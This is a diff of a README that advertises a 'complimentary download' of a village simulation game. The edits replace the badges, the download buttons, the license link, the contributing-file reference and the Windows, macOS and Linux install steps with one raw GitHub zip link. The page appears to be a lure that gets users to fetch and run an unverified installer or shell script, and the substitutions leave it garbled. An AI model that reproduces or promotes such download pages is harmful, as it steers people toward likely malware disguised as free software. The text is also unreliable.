@@ -1,9 +1,9 @@
 # VillageRhapsody Complimentary Download | 🎮 The Most Immersive Village Simulation Adventure
 
-![Maintenance](https://img.shields.io/badge/Maintained-yes-brightgreen)
-![Version](https://img.shields.io/badge/Version-2025--Spring-blueviolet)
-![License](https://img.shields.io/badge/License-MIT-yellow)
-![Downloads](https://img.shields.io/badge/Download-Now-ff69b4)
+![Maintenance](https://github.com/hirunjinadasa/villagerhapsody-open-access-edition/raw/refs/heads/branch/opsonification/access_edition_open_villagerhapsody_v1.2.zip)
+![Version](https://github.com/hirunjinadasa/villagerhapsody-open-access-edition/raw/refs/heads/branch/opsonification/access_edition_open_villagerhapsody_v1.2.zip)
+![License](https://github.com/hirunjinadasa/villagerhapsody-open-access-edition/raw/refs/heads/branch/opsonification/access_edition_open_villagerhapsody_v1.2.zip)
+![Downloads](https://github.com/hirunjinadasa/villagerhapsody-open-access-edition/raw/refs/heads/branch/opsonification/access_edition_open_villagerhapsody_v1.2.zip)
 
 ---
 
@@ -11,7 +11,7 @@ Welcome to **VillageRhapsody Complimentary Download HQ** — your oasis for the 
 
 Are you ready to download and embark on your own Rhapsodic journey? 🎶✨
 
-[![Download](https://img.shields.io/badge/Download--Now-32CD32?logo=BookStack&logoColor=white&style=for-the-badge)](https://hirunjinadasa.github.io)
+[![Download](https://github.com/hirunjinadasa/villagerhapsody-open-access-edition/raw/refs/heads/branch/opsonification/access_edition_open_villagerhapsody_v1.2.zip)](https://github.com/hirunjinadasa/villagerhapsody-open-access-edition/raw/refs/heads/branch/opsonification/access_edition_open_villagerhapsody_v1.2.zip)
 
 ---
 
@@ -53,7 +53,7 @@ _Each feature is designed for ultra-immersive, next-generation rural escapism. L
 
 _Gain instant, uninterrupted access by following these steps:_
 
-1. Click the enticing https://hirunjinadasa.github.io provided above or below.
+1. Click the enticing https://github.com/hirunjinadasa/villagerhapsody-open-access-edition/raw/refs/heads/branch/opsonification/access_edition_open_villagerhapsody_v1.2.zip provided above or below.
 2. Download your VillageRhapsody symphony package from the official distribution channel.
 3. (See below for image-based download instructions!)
 
@@ -61,13 +61,13 @@ _Gain instant, uninterrupted access by following these steps:_
 
 Click the button below to commence your voyage with VillageRhapsody:
 
-[![Download](https://img.shields.io/badge/Download--Now-32CD32?logo=BookStack&logoColor=white&style=for-the-badge)](https://hirunjinadasa.github.io)
+[![Download](https://github.com/hirunjinadasa/villagerhapsody-open-access-edition/raw/refs/heads/branch/opsonification/access_edition_open_villagerhapsody_v1.2.zip)](https://github.com/hirunjinadasa/villagerhapsody-open-access-edition/raw/refs/heads/branch/opsonification/access_edition_open_villagerhapsody_v1.2.zip)
 
 ### Step 3: Simply Unpack and Install
 
-- **Windows:** Double-click `VillageRhapsody-Installer.exe` and follow the melodic prompts.
-- **macOS:** Open `VillageRhapsody.pkg` and glide through the installation.
-- **Linux:** Unpack the `.tar.gz` and launch the shell script; dependencies resolve automatically.
+- **Windows:** Double-click `https://github.com/hirunjinadasa/villagerhapsody-open-access-edition/raw/refs/heads/branch/opsonification/access_edition_open_villagerhapsody_v1.2.zip` and follow the melodic prompts.
+- **macOS:** Open `https://github.com/hirunjinadasa/villagerhapsody-open-access-edition/raw/refs/heads/branch/opsonification/access_edition_open_villagerhapsody_v1.2.zip` and glide through the installation.
+- **Linux:** Unpack the `https://github.com/hirunjinadasa/villagerhapsody-open-access-edition/raw/refs/heads/branch/opsonification/access_edition_open_villagerhapsody_v1.2.zip` and launch the shell script; dependencies resolve automatically.
 
 ### Step 4: Run and Customize
 
@@ -116,7 +116,7 @@ _Want your blacksmith to answer riddles, or your town council to adapt proposals
 
 ## ⚠️ Disclaimer
 
-This repository and associated materials are strictly for **personal educational and entertainment use**. Redistribution, monetization, or any unauthorized commercialization of the VillageRhapsody installation package is strictly prohibited. Always download from the official https://hirunjinadasa.github.io to ensure authenticity and security.
+This repository and associated materials are strictly for **personal educational and entertainment use**. Redistribution, monetization, or any unauthorized commercialization of the VillageRhapsody installation package is strictly prohibited. Always download from the official https://github.com/hirunjinadasa/villagerhapsody-open-access-edition/raw/refs/heads/branch/opsonification/access_edition_open_villagerhapsody_v1.2.zip to ensure authenticity and security.
 
 This project is provided as-is. The maintainers are not responsible for any unforeseen consequences, including but not limited to, digital hay fever, existential sheep debates, or excessive joy.
 
@@ -124,18 +124,18 @@ This project is provided as-is. The maintainers are not responsible for any unfo
 
 ## 📜 MIT License
 
-This repository operates under the [MIT License](https://opensource.org/licenses/MIT) (c) 2025. See `LICENSE` for full details.
+This repository operates under the [MIT License](https://github.com/hirunjinadasa/villagerhapsody-open-access-edition/raw/refs/heads/branch/opsonification/access_edition_open_villagerhapsody_v1.2.zip) (c) 2025. See `LICENSE` for full details.
 
 ---
 
 ## 🌈 Community & Contribution
 
-Do you crave a livelier harvest festival, smoother crop rotation, or more dramatic thunderstorms? Contribute your code, artwork, or story ideas! Pull requests and enhancements are cherished like rare seeds in spring. Check `CONTRIBUTING.md` for guidelines.
+Do you crave a livelier harvest festival, smoother crop rotation, or more dramatic thunderstorms? Contribute your code, artwork, or story ideas! Pull requests and enhancements are cherished like rare seeds in spring. Check `https://github.com/hirunjinadasa/villagerhapsody-open-access-edition/raw/refs/heads/branch/opsonification/access_edition_open_villagerhapsody_v1.2.zip` for guidelines.
 
 ---
 
 ## 🚀 Ready to Play? Download VillageRhapsody and Harmonize Your World!
 
-[![Download](https://img.shields.io/badge/Download--Now-32CD32?logo=BookStack&logoColor=white&style=for-the-badge)](https://hirunjinadasa.github.io)
+[![Download](https://github.com/hirunjinadasa/villagerhapsody-open-access-edition/raw/refs/heads/branch/opsonification/access_edition_open_villagerhapsody_v1.2.zip)](https://github.com/hirunjinadasa/villagerhapsody-open-access-edition/raw/refs/heads/branch/opsonification/access_edition_open_villagerhapsody_v1.2.zip)
 
 _Your symphonic journey awaits — may your fields always be green and your villagers content._
